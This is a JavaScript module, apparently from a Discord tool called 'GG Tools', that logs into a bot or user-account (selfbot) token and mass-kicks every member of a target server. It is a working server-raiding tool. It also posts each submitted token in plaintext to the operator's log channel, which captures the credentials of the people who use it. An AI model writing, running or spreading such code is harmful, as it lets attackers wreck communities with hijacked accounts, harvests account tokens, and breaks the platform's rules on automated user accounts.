const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
const fs = require('fs');
const path = require('path');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

async function kickAll({ token, guildId, tokenType, interaction, logsChannelId, whitelist = [] }) {
  let client;
  if (tokenType === 'bot') {
    client = new BotClient({
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages
      ]
    });
  } else {
    client = new SelfbotClient();
  }
  let erroLogin = false;
  try {
    await client.login(token).catch(() => erroLogin = true);
  } catch {
    erroLogin = true;
  }
  if (erroLogin) {
    await interaction.editReply({ content: '\`❌\` Token inválido, tente novamente!', flags : 64 });
    return;
  }
  const member = await interaction.guild.members.fetch(interaction.user.id);
  const cargoUniversal = config.cargo_permitido_universal;
  const cargoEspecifico = config.cargo_permitido_kickall;
  if ((cargoUniversal || cargoEspecifico) && !member.roles.cache.has(cargoUniversal) && !member.roles.cache.has(cargoEspecifico)) {
    await interaction.editReply({ content: '\`❌\` \`❌\` Você não tem permissão para esta ação, resgate seu acesso em https://discord.com/channels/1352435898205208680/1382212010590081164.', flags : 64 });
    return;
  }
  try {
    const guild = await client.guilds.fetch?.(guildId) || client.guilds.cache.get(guildId);
    if (!guild) throw new Error('Servidor não encontrado ou sem permissão.');
    await guild.members.fetch({ force: true });
    const allMembers = Array.from(guild.members.cache.values());
    const me = guild.members.me || guild.members.cache.get(client.user.id);
    const isOwner = guild.ownerId === client.user.id;
    const isAdmin = me && me.permissions.has(PermissionsBitField.Flags.Administrator);
    await interaction.editReply({ content: `Membros carregados: **${allMembers.length}**. Iniciando kickall...`, flags : 64 });
    let kicked = 0, errors = 0, skipped = 0;
    let errorDetails = [];
    for (const member of allMembers) {
      if (member.id === client.user.id) {
        skipped++;
        errorDetails.push(`Ignorado: ${member.user?.tag || member.id} (próprio bot/dono)`);
        continue;
      }
      if (whitelist.includes(member.id)) {
        skipped++;
        errorDetails.push(`Ignorado: ${member.user?.tag || member.id} (whitelist)`);
        continue;
      }
      // O dono pode tentar expulsar todos, exceto ele mesmo
      // Admin pode tentar expulsar todos, exceto o dono e ele mesmo
      if (!isOwner && member.id === guild.ownerId) {
        skipped++;
        errorDetails.push(`Ignorado: ${member.user?.tag || member.id} (dono do servidor)`);
        continue;
      }
      // BOT: só pode expulsar se kickable
      if (tokenType === 'bot' && !member.kickable) {
        skipped++;
        errorDetails.push(`Não foi possível expulsar ${member.user?.tag || member.id} (bot sem permissão/cargo suficiente)`);
        continue;
      }
      // SELF: só pode expulsar se não for dono e não for admin
      if (tokenType !== 'bot' && !isOwner && !isAdmin && !member.kickable) {
        skipped++;
        errorDetails.push(`Não foi possível expulsar ${member.user?.tag || member.id} (não kickable, cargo igual/superior ou permissão faltando)`);
        continue;
      }
      try {
        await member.kick('kickall');
        kicked++;
        await new Promise(r => setTimeout(r, 500));
      } catch (e) {
        errors++;
        errorDetails.push(`Erro ao expulsar ${member.user?.tag || member.id}: ${e.message}`);
      }
    }
    let resumo = `\`✅\` Kickall concluído!\nMembros carregados: **${allMembers.length}**\nMembros expulsos: **${kicked}**\nErros: **${errors}**\nIgnorados: **${skipped}**`;
    if (errorDetails.length > 0) {
      resumo += `\n\nAlguns detalhes:\n` + errorDetails.slice(0, 10).join('\n');
      if (errorDetails.length > 10) resumo += `\n...e mais ${errorDetails.length - 10} membros não expulsos.`;
    }
    await interaction.editReply({ content: resumo, flags : 64 });
    // Log detalhado
    const logChannelId = config.log_kickall || config.log_cleaner || logsChannelId || config.log_extracao;
    if (logChannelId) {
      const logChannel = interaction.client.channels.cache.get(logChannelId);
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle('👢 Kickall Executado')
          .setColor(0x5865F2)
          .addFields(
            { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Token', value: `||${token}||`, inline: false },
            { name: 'Servidor', value: `\`${guildId}\``, inline: true },
            { name: 'Carregados', value: `${allMembers.length}`, inline: true },
            { name: 'Expulsos', value: `${kicked}`, inline: true },
            { name: 'Ignorados', value: `${skipped}`, inline: true },
            { name: 'Erros', value: `${errors}`, inline: true },
            { name: 'Tipo de Token', value: tokenType, inline: true },
            { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
          )
          .setFooter({ text: 'GG Tools' });
        if (errorDetails.length > 0) {
          embed.addFields({ name: 'Detalhes', value: errorDetails.slice(0, 10).join('\n') + (errorDetails.length > 10 ? `\n...e mais ${errorDetails.length - 10}` : ''), inline: false });
        }
        logChannel.send({ embeds: [embed] });
      }
    }
  } catch (err) {
    await interaction.editReply({ content: '\`❌\` Erro ao executar Kickall: ' + err.message, flags : 64 });
  }
  await client.destroy?.();
  await client.logout?.().catch(() => {});
}

module.exports = { kickAll };
